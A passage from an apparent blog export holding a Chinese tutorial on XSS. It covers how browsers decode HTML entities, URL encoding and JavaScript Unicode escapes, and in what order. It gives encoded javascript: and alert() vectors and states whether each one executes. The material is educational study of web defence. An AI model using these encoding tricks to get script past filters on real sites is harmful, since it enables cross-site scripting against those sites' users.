接着由JavaScript解析器会再对`onclick`部分的JS进行解析并执行JS；\n>\n> 执行JS后`window.open('UserInput')`函数的参数会传入URL，所以再由URL解析器对`UserInput`部分进行解码。\n>\n> 因此解析顺序为：HTML解析——>JavaScript解析——>URL解析。\n\n> **`<a href=\"javascript:window.open('UserInput')\">`**\n>\n> 该例子中，首先还是由HTML解析器对`UserInput`部分进行字符实体解码；\n>\n> 接着由URL解析器解析`href`的属性值；\n>\n> 然后由于Scheme为`javascript`，所以由JavaScript解析；\n>\n> 解析执行JS后`window.open('UserInput')`函数传入URL，所以再由URL解析器解析。\n>\n> 所以解析顺序为：HTML解析——>URL解析——>JavaScript解析——>URL解析。\n\n综合实例：\n\n**`<a  href=\"&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;\n&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;\n&#x36;&#x25;&#x33;&#x31;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;\n&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x33;&#x25;&#x35;&#x63;&#x25;\n&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;\n&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;\n&#x25;&#x33;&#x37;&#x25;&#x33;&#x32;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;\n&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x34;&#x28;&#x31;\n&#x35;&#x29;\"> </a>`**\n\n首先HTML解析器进行解析，解析到`href`属性的值时，状态机进入**`属性值状态（Attribute Value State）`**，该状态会解码字符实体，解码得到结果：\n\n![](0x00-XSS学习系列之解析HTML文档\\QQ截图20190308105040.png)\n\n接着由URL解析器进行解析并解码：\n\n![](0x00-XSS学习系列之解析HTML文档\\QQ截图20190308105254.png)\n\n再接着由于Scheme为javascript，因此由JavaScript解析器解析并解码，加上编码部分是函数名，属于标识符，因此可以正常解码解释：\n\n![](0x00-XSS学习系列之解析HTML文档\\QQ截图20190308105533.png)\n\n经过三轮解析解码后得到结果：`<a href=\"javascript:alert(15)\"></a>`\n\n参考连接：\n\nhttps://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html\n\nhttps://security.yirendai.com/news/share/26\n\nhttps://xz.aliyun.com/t/1556\n\nhttps://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md","source":"_posts/0x00-XSS学习系列之解析HTML文档.md","raw":"---\ntitle: XSS学习系列Chapter 1：浏览器解析HTML文档\ndate: 2019-03-07 11:59:02\ntags: \n\t- XSS\n\t- 编码与解码\n\t- HTML文档解析\ncategories: WEB漏洞学习\n---\n\n## 一、前端基本编码知识\n\n### 0x00 为什么要进行编码?\n\n> 主要是因为某些数据不适合传输。原因多种多样，如Size过大，包含隐私数据，另外重要的一点就是有些字符会**引起歧义**。\n\n对于URL，\n\n> `&`用于分割多个参数，倘若有某个参数键值对为`name=v&lue`，就会因为`name`参数的值`v&lue`中携带了`&`而造成歧义。因此需要对`&`进行URL编码。\n\n对于HTML，\n\n> 当浏览器遇到`<`会识别为元素定义的开始，`>`会识别为元素的结束。倘若有`<div  id=\"1>\" ></div>`，由于标签的属性值携带了`>`，同样会造成歧义。因此需要属性值的`>`需要进行HTML编码，即使用字符实体。\n\n<!-- more -->\n\n### 0x01 URL编码\n\n> RFC3986文档规定，Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符。\n\n编码方式，\n\n> `%`加`字符在ASCII码表中的十六进制值`。\n>\n> 例如，`/`在ASCII码表中十六进制为`0x2f`，那么它对应的URL编码为`%2f`。\n\nJavaScript中提供了3个函数用来对Url编码以得到合法的Url：\n\n- escape()\n- encodeURI（）\n- encodeURIComponent（）\n\n参考连接：https://www.cnblogs.com/jerrysion/p/5522673.html\n\n### 0x02 HTML编码（字符实体）\n\n字符实体是一个预先定义好的转义序列。\n\n字符实体两种表示方法:\n\n> - 字符实体以`&`开头+预先定义的`实体名称`+`;`分号结束，如“<”的实体名称为`&lt;`\n> - 字符实体还可以以`&`开头+`#`符号+`字符在ASCII对应的十进制数字`+`;`分号结束，如`<`的实体编号为`&#60;`。\n\n**字符都是有实体编号的，但有些字符是没有实体名称的。**\n\n![](0x00-XSS学习系列之解析HTML文档\\QQ截图20190307120011.png)\n\n### 0x03 JavaScript编码\n\n最常用的如`\\uXXXX`这种写法的Unicode转义序列，表示一个字符，其中`xxxx`表示一个16进制数字，如`<`Unicode编码为`\\u003c`。\n\n## 二、解析HTML文档\n\n解析一个HTML文档涉及三个主要过程：HTML解析——>URL解析——JavaScript解析。\n\n每一个过程由相应的解析器进行解码解析：HTML解析器、URL解析器、JavaScript解析器。\n\n### 0x00 HTML解析器\n\nHTML解析器以状态机的方式运行，它从文档输入流中消耗字符并根据其转换规则转换到不同的状态。\n\n> 当HTML解析器遇到`<`字符，且字符后不包含`/`,即不是闭合标签时，状态机就会进入**`标签打开状态（Tag Open State）`**，随后再进入**`标签名称状态（Tag Name State）`**、**`属性名称前状态（Before Attribute Name State）`**......最后进入**`数据状态（Data State）`**并且发布当前**`标签令牌（Token）`**。状态机处于**`数据状态（Data State）`**时，会继续上述的步骤，遇到完整的标签就发出**`标签令牌（Token）`**。\n\nHTML解析器处于**`数据状态（Data State）`**、**`RCDATA 状态（RCDATA State）`**、**`属性值状态（Attribute Value State）`**时，**字符实体**会被解码为对应的字符。\n\n例子，\n\n> **`<div>&#60;img src=x onerror=alert(4)&#62;</div>`**\n>\n> `<`和`>`被编码为字符实体`&#60;`和`&#62;`。\n>\n> 当HTML解析器解析完`<div>`时，会进入**`数据状态（Data State）`**并发布标签令牌。接着解析到实体`&#60;`时因为处在**`数据状态（Data State）`**就会对实体进行解码为`<`，后面的`&#62;`同样道理被解码为`>`。\n\n这里会有个问题，被解码后，`img`是否会被解析为HTML标签而导致JS执行呢？\n\n> 答案是否定的。因为解析器在使用字符引用后不会转换到**`标签打开状态（Tag Open State）`**，不进入标签打开状态就不会被发布为HTML标签。因此，不会创建新HTML标签，只会将其作为数据来处理。\n>\n> **这也是为什么我们可以使用字符实体来避免用户不安全输入导致XSS的原因。**\n\n**RCDATA**\n\n在HTML中，属于**`RCDATA Elements`**的标签有两个：`textarea`、`title`。\n\n**`RCDATA Elements`**类型的标签可以包含文本内容和字符实体。\n\n解析器解析到`textarea`、`title`标签的数据部分时，状态会进入**`RCDATA State`**。\n\n前面我们提到，处于**`RCDATA State`**状态时，字符实体是会被解析器解码的。\n\n例子， \n\n> **`<textarea>&#60;script&#62;alert(5)&#60;/script&#62;</textarea>`**\n>\n> `<`和`>`被编码为实体`&#60;`和`&#62;`。\n>\n> 解析器解析到它们时会进行解码，最终得到**`<textarea><script>alert(5)</script></textarea>`**。但是里面的JS同样还是不会被执行，原因还是因为解码字符实体状态机不会进入**`标签打开状态（Tag Open State）`**，因此里面的`<script>`并不会被解析为HTML标签。\n\n事实上，任何`RCDATA`（`textarea`、`title`里面的数据）都不会使得状态机进入**`标签打开状态（Tag Open State）`**，So if a user input wants to escape out of the CDATA context, it has to use the exact \"]]>\" sequence without any encoding。\n\nHTML解析规范：https://html.spec.whatwg.org/multipage/parsing.html#tokenization\n\n### 0x01 URL解析器\n\nURL解析器也被建模为状态机，文档输入流中的字符可以将其导向不同的状态。\n\n首先，要注意的是URL的`Scheme`部分（协议部分）必须为ASCII字符，即不能被任何编码，否则URL解析器的状态机将进入**`No Scheme`**状态。\n\n例如，\n\n> **` <a href=\"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\"></a>`**\n>\n> URL编码部分的是`javascript:alert(1)`。\n>\n> JS不会被执行，因为作为`Scheme`部分的`\"javascript\"`这个字符串被编码，导致URL解析器状态机进入**`No Scheme`**状态。\n\n同样，URL中的`:`也不能被以任何方式编码，否则URL解析器的状态机也将进入**`No Scheme`**状态。\n\n例如，\n\n> **`<a href=\"javascript%3aalert(3)\"></a>`**\n>\n> 由于`:`被URL编码为`%3a`，导致URL状态机进入**`No Scheme`**状态，JS代码不能执行。\n\n另一个例子：\n\n**`<a href=\"&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:%61%6c%65%72%74%28%32%29\">`**\n\n`\"javascript\"`这个字符串被实体化编码，`:`没有被编码,`alert(2)`被URL编码。\n\n例子中的JS被成功执行。那么将产生一个问题。为什么作为URL的`Scheme`部分的`\"javascript\"`这个字符串被编码了但JS还是被执行了？\n\n> 原因在于，首先，在HTML解析器中我们谈到过，HTML状态机处于**`属性值状态（Attribute Value State）`**时，字符实体时会被解码的，此处在`href`属性中，所以被实体化编码的`\"javascript\"`字符串会被解码。其次，HTML解析是在URL解析之前的，所以在进行URL解析之前，`Scheme`部分的`\"javascript\"`字符串已被解码，而并不再是被实体编码的状态。\n\nURL解析规范：https://url.spec.whatwg.org/\n\nURL地址结构：https://blog.csdn.net/x_nirvana/article/details/50768906\n\n### 0x02 JavaScript解析器\n\nJavaScript解析与HTML解析的区别在于JavaScript是上下文自由的。\n\n在HTML中，属于**`Raw text elements`**的标签有两个：`script`、`style`。\n\n在**`Raw text elements`**类型标签下的所有内容块都属于该标签。\n\n存在一条特性：\n\n> 即**`Raw text elements`**类型标签下的所有字符实体编码都不会被HTML解码。HTML解析器解析到`script`、`style`标签的内容块（数据）部分时，状态会进入**`Script Data State`**，该状态并不在我们前面说的会解码字符实体的三条状态之中。\n\n因此，**`<script>&#97;&#108;&#101;&#114;&#116&#40;&#57;&#41;&#59</script>`**这样字符实体并不会被解码，也就不会执行JS。\n\n形如 `\\uXXXX`这样的Unicode字符转义序列或Hex编码是否能被解码需要看情况。\n\n首先，JavaScript中有三个地方可以出现Unicode字符转义序列：\n\n字符串中（in String）\n\n> `Unicode escape sequences will NEVER break out of the string context in JavaScript because they will always be interpreted as string literals.`\n>\n> 即，Unicode转义序列出现在字符串中时，它只会被解释为普通字符，而不会破坏字符串的上下文。例如`\\u000A`在Java字符串中会被解释为行终止符，会导致字符串上下文断裂。但在JavaScript中的字符串只会被解释为普通字符。简单说就是会被解码，但只解释为字符串的一部分。\n\n标识符中（in identifier names）\n\n> 若Unicode转义序列存在于标识符中，即变量名（如函数名等...），它会被进行解码。\n>\n> 例如，**`<script>\\u0061\\u006c\\u0065\\u0072\\u0074(10);</script>`**\n>\n> 被编码转义的部分为`alert`字符，是函数名，属于在标识符中的情况，因此会被正常解码，JS代码也会被执行。\n\n控制字符中（in control characters）\n\n> 若Unicode转义序列存在于控制字符中，那么它会被解码但不会被解释为控制字符，而会被解释为标识符或字符串字符的一部分。\n>\n> 控制字符即`'`、`\"`、`()`等。\n>\n> 例如，**`<script> alert\\u0028\"xss\"); </script>`**，`(`进行了Unicode编码，那么解码后它不再是作为控制字符，而是作为标识符的一部分`alert(`。\n>\n> 因此函数的括号之类的控制字符进行Unicode转义后是不能被正常解码解释的。\n\n总结，Unicode序列只有出现在标识符中时，才能被正常的解码解释。\n\n例子，\n\n> **`<script>\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029</script>`**\n>\n> 被编码部分为`alert(11)`。\n>\n> 该例子中的JS不会被执行，因为控制字符被编码了。\n\n> **` <script>\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)</script>`**\n>\n> 被编码部分为`alert`及括号内为`12`。\n>\n> 该例子中JS不会被执行，原因在于括号内被编码的部分不能被正常解码解释，要么使用ASCII数字，要么加`\"\"`或`''`使其变为字符串，作为字符串也只能作为普通字符。\n\n> **`<script>alert('13\\u0027)</script>`**\n>\n> 被编码处为`'`。\n>\n> 该例的JS不会执行，因为控制字符被编码了，解码后的`'`将变为字符串的一部分，而不再解释为控制字符。因此该例中字符串是不完整的，因为没有`'`来结束字符串。\n\n> **`<script>alert('14\\u000a')</script>`**\n>\n> 该例的JS会被执行，因为被编码的部分处于字符串内，只会被解释为普通字符，不会突破字符串上下文。\n\n### 0x03 解析顺序\n\n首先浏览器接收到一个HTML文档时，会触发HTML解析器对HTML文档进行词法解析，这一过程完成HTML解码并创建DOM树，接下来JavaScript解析器会介入对内联脚本进行解析，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析。HTML解析总是第一步。\n\nURL解析和JavaScript解析，它们的解析顺序要根据情况而定。\n\n例子，\n\n> **`<a href=\"UserInput\"></a>`**\n>\n> 该例子中，首先由HTML解析器对`UserInput`部分进行字符实体解码；\n>\n> 接着URL解析器对`UserInput`进行URL decode；\n>\n> 如果URL的Scheme部分为`javascript`的话，JavaScript解析器会再对`UserInput`进行解码。\n>\n> 所以解析顺序是：HTML解析——>URL解析——>JavaScript解析。\n\n> **`<a href=# onclick=\"window.open('UserInput')\"></a>`**\n>\n> 该例子中，首先由HTML解析器对`UserInput`部分进行字符实体解码；\n>\n> 接着由JavaScript解析器会再对`onclick`部分的JS进行解析并执行JS；\n>\n> 执行JS后`window.open('UserInput')`函数的参数会传入URL，所以再由URL解析器对`UserInput`部分进行解码。\n>\n> 因此解析顺序为：HTML解析——>JavaScript解析——>URL解析。\n\n> **`<a href=\"javascript:window.open('UserInput')\">`**\n>\n> 该例子中，首先还是由HTML解析器对`UserInput`部分进行字符实体解码；\n>\n> 接着由URL解析器解析`href`的属性值；\n>\n> 然后由于Scheme为`javascript`，所以由JavaScript解析；\n>\n> 解析执行JS后`window.open('UserInput')`函数传入URL，所以再由URL解析器解析。\n>\n> 所以解析顺序为：HTML解析——>URL解析——>JavaScript解析——>URL解析。\n\n综合实例：\n\n**`<a  href=\"&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;\n&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;\n&#x36;&#x25;&#x33;&#x31;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;\n&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x33;&#x25;&#x35;&#x63;&#x25;\n&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;\n&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;\n&#x25;&#x33;&#x37;&#x25;&#x33;&#x32;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;\n&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x34;&#x28;&#x31;\n&#x35;&#x29;\"> </a>`**\n\n首先HTML解析器进行解析，解析到`href`属性的值时，状态机进入**`属性值状态（Attribute Value State）`**，该状态会解码字符实体，解码得到结果：\n\n![](0x00-XSS学习系列之解析HTML文档\\QQ截图20190308105040.png)\n\n接着由URL解析器进行解析并解码：\n\n![](0x00-XSS学习系列之解析HTML文档\\QQ截图20190308105254.png)\n\n再接着由于Scheme为javascript，因此由JavaScript解析器解析并解码，加上编码部分是函数名，属于标识符，因此可以正常解码解释：\n\n![](0x00-XSS学习系列之解析HTML文档\\QQ截图20190308105533.png)\n\n经过三轮解析解码后得到结果：`<a href=\"javascript:alert(15)\"></a>`\n\n参考连接：\n\nhttps://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html\n\nhttps://security.yirendai.com/news/share/26\n\nhttps://xz.aliyun.com/t/1556\n\nhttps://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md","slug":"0x00-XSS学习系列之解析HTML文档","published":1,"updated":"2019-03-19T08:00:05.824Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83n500627or066rrv049","content":"<h2 id=\"一、前端基本编码知识\"><a href=\"#一、前端基本编码知识\" class=\"headerlink\" title=\"一、前端基本编码知识\"></a>一、前端基本编码知识</h2><h3 id=\"0x00-为什么要进行编码\"><a href=\"#0x00-为什么要进行编码\" class=\"headerlink\" title=\"0x00 为什么要进行编码?\"></a>0x00 为什么要进行编码?</h3><blockquote>\n<p>主要是因为某些数据不适合传输。原因多种多样，如Size过大，包含隐私数据，另外重要的一点就是有些字符会<strong>引起歧义</strong>。</p>\n</blockquote>\n<p>对于URL，</p>\n<blockquote>\n<p><code>&amp;</code>用于分割多个参数，倘若有某个参数键值对为<code>name=v&amp;lue</code>，就会因为<code>name</code>参数的值<code>v&amp;lue</code>中携带了<code>&amp;</code>而造成歧义。因此需要对<code>&amp;</code>进行URL编码。</p>\n</blockquote>\n<p>对于HTML，</p>\n<blockquote>\n<p>当浏览器遇到<code>&lt;</code>会识别为元素定义的开始，<code>&gt;</code>会识别为元素的结束。倘若有<code>&lt;div  id=&quot;1&gt;&quot; &gt;&lt;/div&gt;</code>，由于标签的属性值携带了<code>&gt;</code>，同样会造成歧义。因此需要属性值的<code>&gt;</code>需要进行HTML编码，即使用字符实体。</p>\n</blockquote>\n<a id=\"more\"></a>\n<h3 id=\"0x01-URL编码\"><a href=\"#0x01-URL编码\" class=\"headerlink\" title=\"0x01 URL编码\"></a>0x01 URL编码</h3><blockquote>\n<p>RFC3986文档规定，Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符。</p>\n</blockquote>\n<p>编码方式，</p>\n<blockquote>\n<p><code>%</code>加<code>字符在ASCII码表中的十六进制值</code>。</p>\n<p>例如，<code>/</code>在ASCII码表中十六进制为<code>0x2f</code>，那么它对应的URL编码为<code>%2f</code>。</p>\n</blockquote>\n<p>JavaScript中提供了3个函数用来对Url编码以得到合法的Url：</p>\n<ul>\n<li>escape()</li>\n<li>encodeURI（）</li>\n<li>encodeURIComponent（）</li>\n</ul>\n<p>参考连接：<a href=\"https://www.cnblogs.com/jerrysion/p/5522673.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/jerrysion/p/5522673.html</a></p>\n<h3 id=\"0x02-HTML编码（字符实体）\"><a href=\"#0x02-HTML编码（字符实体）\" class=\"headerlink\" title=\"0x02 HTML编码（字符实体）\"></a>0x02 HTML编码（字符实体）</h3><p>字符实体是一个预先定义好的转义序列。</p>\n<p>字符实体两种表示方法:</p>\n<blockquote>\n<ul>\n<li>字符实体以<code>&amp;</code>开头+预先定义的<code>实体名称</code>+<code>;</code>分号结束，如“&lt;”的实体名称为<code>&amp;lt;</code></li>\n<li>字符实体还可以以<code>&amp;</code>开头+<code>#</code>符号+<code>字符在ASCII对应的十进制数字</code>+<code>;</code>分号结束，如<code>&lt;</code>的实体编号为<code>&amp;#60;</code>。</li>\n</ul>\n</blockquote>\n<p><strong>字符都是有实体编号的，但有些字符是没有实体名称的。</strong></p>\n<p><img src=\"/2019/03/07/0x00-XSS学习系列之解析HTML文档/QQ截图20190307120011.png\" alt></p>\n<h3 id=\"0x03-JavaScript编码\"><a href=\"#0x03-JavaScript编码\" class=\"headerlink\" title=\"0x03 JavaScript编码\"></a>0x03 JavaScript编码</h3><p>最常用的如<code>\\uXXXX</code>这种写法的Unicode转义序列，表示一个字符，其中<code>xxxx</code>表示一个16进制数字，如<code>&lt;</code>Unicode编码为<code>\\u003c</code>。</p>\n<h2 id=\"二、解析HTML文档\"><a href=\"#二、解析HTML文档\" class=\"headerlink\" title=\"二、解析HTML文档\"></a>二、解析HTML文档</h2><p>解析一个HTML文档涉及三个主要过程：HTML解析——&gt;URL解析——JavaScript解析。</p>\n<p>每一个过程由相应的解析器进行解码解析：HTML解析器、URL解析器、JavaScript解析器。</p>\n<h3 id=\"0x00-HTML解析器\"><a href=\"#0x00-HTML解析器\" class=\"headerlink\" title=\"0x00 HTML解析器\"></a>0x00 HTML解析器</h3><p>HTML解析器以状态机的方式运行，它从文档输入流中消耗字符并根据其转换规则转换到不同的状态。</p>\n<blockquote>\n<p>当HTML解析器遇到<code>&lt;</code>字符，且字符后不包含<code>/</code>,即不是闭合标签时，状态机就会进入<strong><code>标签打开状态（Tag Open State）</code></strong>，随后再进入<strong><code>标签名称状态（Tag Name State）</code></strong>、<strong><code>属性名称前状态（Before Attribute Name State）</code></strong>……最后进入<strong><code>数据状态（Data State）</code></strong>并且发布当前<strong><code>标签令牌（Token）</code></strong>。状态机处于<strong><code>数据状态（Data State）</code></strong>时，会继续上述的步骤，遇到完整的标签就发出<strong><code>标签令牌（Token）</code></strong>。</p>\n</blockquote>\n<p>HTML解析器处于<strong><code>数据状态（Data State）</code></strong>、<strong><code>RCDATA 状态（RCDATA State）</code></strong>、<strong><code>属性值状态（Attribute Value State）</code></strong>时，<strong>字符实体</strong>会被解码为对应的字符。</p>\n<p>例子，</p>\n<blockquote>\n<p><strong><code>&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</code></strong></p>\n<p><code>&lt;</code>和<code>&gt;</code>被编码为字符实体<code>&amp;#60;</code>和<code>&amp;#62;</code>。</p>\n<p>当HTML解析器解析完<code>&lt;div&gt;</code>时，会进入<strong><code>数据状态（Data State）</code></strong>并发布标签令牌。接着解析到实体<code>&amp;#60;</code>时因为处在<strong><code>数据状态（Data State）</code></strong>就会对实体进行解码为<code>&lt;</code>，后面的<code>&amp;#62;</code>同样道理被解码为<code>&gt;</code>。</p>\n</blockquote>\n<p>这里会有个问题，被解码后，<code>img</code>是否会被解析为HTML标签而导致JS执行呢？</p>\n<blockquote>\n<p>答案是否定的。因为解析器在使用字符引用后不会转换到<strong><code>标签打开状态（Tag Open State）</code></strong>，不进入标签打开状态就不会被发布为HTML标签。因此，不会创建新HTML标签，只会将其作为数据来处理。</p>\n<p><strong>这也是为什么我们可以使用字符实体来避免用户不安全输入导致XSS的原因。</strong></p>\n</blockquote>\n<p><strong>RCDATA</strong></p>\n<p>在HTML中，属于<strong><code>RCDATA Elements</code></strong>的标签有两个：<code>textarea</code>、<code>title</code>。</p>\n<p><strong><code>RCDATA Elements</code></strong>类型的标签可以包含文本内容和字符实体。</p>\n<p>解析器解析到<code>textarea</code>、<code>title</code>标签的数据部分时，状态会进入<strong><code>RCDATA State</code></strong>。</p>\n<p>前面我们提到，处于<strong><code>RCDATA State</code></strong>状态时，字符实体是会被解析器解码的。</p>\n<p>例子， </p>\n<blockquote>\n<p><strong><code>&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</code></strong></p>\n<p><code>&lt;</code>和<code>&gt;</code>被编码为实体<code>&amp;#60;</code>和<code>&amp;#62;</code>。</p>\n<p>解析器解析到它们时会进行解码，最终得到<strong><code>&lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt;</code></strong>。但是里面的JS同样还是不会被执行，原因还是因为解码字符实体状态机不会进入<strong><code>标签打开状态（Tag Open State）</code></strong>，因此里面的<code>&lt;script&gt;</code>并不会被解析为HTML标签。</p>\n</blockquote>\n<p>事实上，任何<code>RCDATA</code>（<code>textarea</code>、<code>title</code>里面的数据）都不会使得状态机进入<strong><code>标签打开状态（Tag Open State）</code></strong>，So if a user input wants to escape out of the CDATA context, it has to use the exact “]]&gt;” sequence without any encoding。</p>\n<p>HTML解析规范：<a href=\"https://html.spec.whatwg.org/multipage/parsing.html#tokenization\" target=\"_blank\" rel=\"noopener\">https://html.spec.whatwg.org/multipage/parsing.html#tokenization</a></p>\n<h3 id=\"0x01-URL解析器\"><a href=\"#0x01-URL解析器\" class=\"headerlink\" title=\"0x01 URL解析器\"></a>0x01 URL解析器</h3><p>URL解析器也被建模为状态机，文档输入流中的字符可以将其导向不同的状态。</p>\n<p>首先，要注意的是URL的<code>Scheme</code>部分（协议部分）必须为ASCII字符，即不能被任何编码，否则URL解析器的状态机将进入<strong><code>No Scheme</code></strong>状态。</p>\n<p>例如，</p>\n<blockquote>\n<p><strong><code>&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;</code></strong></p>\n<p>URL编码部分的是<code>javascript:alert(1)</code>。</p>\n<p>JS不会被执行，因为作为<code>Scheme</code>部分的<code>&quot;javascript&quot;</code>这个字符串被编码，导致URL解析器状态机进入<strong><code>No Scheme</code></strong>状态。</p>\n</blockquote>\n<p>同样，URL中的<code>:</code>也不能被以任何方式编码，否则URL解析器的状态机也将进入<strong><code>No Scheme</code></strong>状态。</p>\n<p>例如，</p>\n<blockquote>\n<p><strong><code>&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;</code></strong></p>\n<p>由于<code>:</code>被URL编码为<code>%3a</code>，导致URL状态机进入<strong><code>No Scheme</code></strong>状态，JS代码不能执行。</p>\n</blockquote>\n<p>另一个例子：</p>\n<p><strong><code>&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;</code></strong></p>\n<p><code>&quot;javascript&quot;</code>这个字符串被实体化编码，<code>:</code>没有被编码,<code>alert(2)</code>被URL编码。</p>\n<p>例子中的JS被成功执行。那么将产生一个问题。为什么作为URL的<code>Scheme</code>部分的<code>&quot;javascript&quot;</code>这个字符串被编码了但JS还是被执行了？</p>\n<blockquote>\n<p>原因在于，首先，在HTML解析器中我们谈到过，HTML状态机处于<strong><code>属性值状态（Attribute Value State）</code></strong>时，字符实体时会被解码的，此处在<code>href</code>属性中，所以被实体化编码的<code>&quot;javascript&quot;</code>字符串会被解码。其次，HTML解析是在URL解析之前的，所以在进行URL解析之前，<code>Scheme</code>部分的<code>&quot;javascript&quot;</code>字符串已被解码，而并不再是被实体编码的状态。</p>\n</blockquote>\n<p>URL解析规范：<a href=\"https://url.spec.whatwg.org/\" target=\"_blank\" rel=\"noopener\">https://url.spec.whatwg.org/</a></p>\n<p>URL地址结构：<a href=\"https://blog.csdn.net/x_nirvana/article/details/50768906\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/x_nirvana/article/details/50768906</a></p>\n<h3 id=\"0x02-JavaScript解析器\"><a href=\"#0x02-JavaScript解析器\" class=\"headerlink\" title=\"0x02 JavaScript解析器\"></a>0x02 JavaScript解析器</h3><p>JavaScript解析与HTML解析的区别在于JavaScript是上下文自由的。</p>\n<p>在HTML中，属于<strong><code>Raw text elements</code></strong>的标签有两个：<code>script</code>、<code>style</code>。</p>\n<p>在<strong><code>Raw text elements</code></strong>类型标签下的所有内容块都属于该标签。</p>\n<p>存在一条特性：</p>\n<blockquote>\n<p>即<strong><code>Raw text elements</code></strong>类型标签下的所有字符实体编码都不会被HTML解码。HTML解析器解析到<code>script</code>、<code>style</code>标签的内容块（数据）部分时，状态会进入<strong><code>Script Data State</code></strong>，该状态并不在我们前面说的会解码字符实体的三条状态之中。</p>\n</blockquote>\n<p>因此，<strong><code>&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</code></strong>这样字符实体并不会被解码，也就不会执行JS。</p>\n<p>形如 <code>\\uXXXX</code>这样的Unicode字符转义序列或Hex编码是否能被解码需要看情况。</p>\n<p>首先，JavaScript中有三个地方可以出现Unicode字符转义序列：</p>\n<p>字符串中（in String）</p>\n<blockquote>\n<p><code>Unicode escape sequences will NEVER break out of the string context in JavaScript because they will always be interpreted as string literals.</code></p>\n<p>即，Unicode转义序列出现在字符串中时，它只会被解释为普通字符，而不会破坏字符串的上下文。例如<code>\\u000A</code>在Java字符串中会被解释为行终止符，会导致字符串上下文断裂。但在JavaScript中的字符串只会被解释为普通字符。简单说就是会被解码，但只解释为字符串的一部分。</p>\n</blockquote>\n<p>标识符中（in identifier names）</p>\n<blockquote>\n<p>若Unicode转义序列存在于标识符中，即变量名（如函数名等…），它会被进行解码。</p>\n<p>例如，<strong><code>&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt;</code></strong></p>\n<p>被编码转义的部分为<code>alert</code>字符，是函数名，属于在标识符中的情况，因此会被正常解码，JS代码也会被执行。</p>\n</blockquote>\n<p>控制字符中（in control characters）</p>\n<blockquote>\n<p>若Unicode转义序列存在于控制字符中，那么它会被解码但不会被解释为控制字符，而会被解释为标识符或字符串字符的一部分。</p>\n<p>控制字符即<code>&#39;</code>、<code>&quot;</code>、<code>()</code>等。</p>\n<p>例如，<strong><code>&lt;script&gt; alert\\u0028&quot;xss&quot;); 